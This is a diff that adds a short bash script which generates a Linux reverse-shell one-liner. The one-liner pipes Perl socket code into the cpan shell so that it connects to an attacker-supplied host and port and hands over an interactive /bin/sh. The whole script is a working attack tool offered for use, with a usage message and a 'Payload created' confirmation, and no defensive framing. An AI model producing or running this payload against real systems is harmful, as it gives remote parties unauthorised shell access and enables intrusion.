@@ -1,0 +1,28 @@
+#!/bin/bash
+
+function define_cpan_payload(){
+cat <<EOF
+printf "y" | cpan && printf "! use Socket; my \\\$i=\"$rhost\"; my \\\$p=$rport; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};" | cpan
+EOF
+}
+
+function Craft_linux_cpan_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux cpan reverse tcp shell\n"
+                printf "Usage bash linux_cpan-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+        #printf "printf \"y\" | cpan && 
+        define_cpan_payload
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_cpan_reverse_shell "$1" "$2"
